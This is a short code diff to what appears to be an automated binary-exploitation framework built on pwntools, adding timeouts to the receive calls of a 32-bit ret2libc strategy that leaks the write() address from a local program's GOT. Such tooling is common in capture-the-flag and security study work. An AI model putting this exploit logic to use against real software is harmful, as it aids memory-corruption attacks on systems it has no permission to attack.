@@ -98,12 +98,19 @@ class Ret2LibcWriteX32LocalStrategy(ExploitStrategy):
             return False
 
         io = process(str(ctx.binary.path))
-        io.recv()
+        # v4.0.2c1: cap initial banner recv at 0.5s (see
+        # ret2libc_put_x32 for the canary+fmtstr hang rationale).
+        try:
+            io.recv(timeout=0.5)
+        except Exception:
+            pass
         io.sendline(payload1)
         print_payload("stage 1: leaking write address from GOT")
 
         try:
-            write_addr = u32(io.recv(4))
+            # v4.0.2c1: add timeout=2 to prevent indefinite hang when
+            # binary doesn't produce the expected 4-byte leak.
+            write_addr = u32(io.recv(4, timeout=2))
         except Exception as e:
             print_info(f"ret2libc-write-x32 leak parse failed: {e}")
             return False
